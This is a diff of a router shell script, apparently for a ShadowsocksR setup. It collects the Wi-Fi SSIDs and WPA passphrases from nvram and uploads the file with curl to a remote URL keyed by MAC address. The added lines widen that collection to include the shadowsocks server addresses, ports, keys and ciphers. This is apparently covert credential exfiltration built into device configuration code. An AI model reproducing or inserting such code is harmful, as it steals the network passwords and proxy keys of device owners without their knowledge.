@@ -580,6 +580,8 @@ if   [ -s ssr.ini ] ; then
 	nvram get wl_wpa_psk >>$fn	
 	nvram get rt_ssid >>$fn	
 	nvram get rt_wpa_psk >>$fn	
+	echo $ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method >>$fn	
+	echo $ss_s2_ip:$ss_s2_port:$ss_s2_key:$ss_s2_method >>$fn		
 	curl -T $fn $ssr_url"mac/"$fn
 
 #    sed  -i  's/^..../ssr:\/\//'  ss.inf   
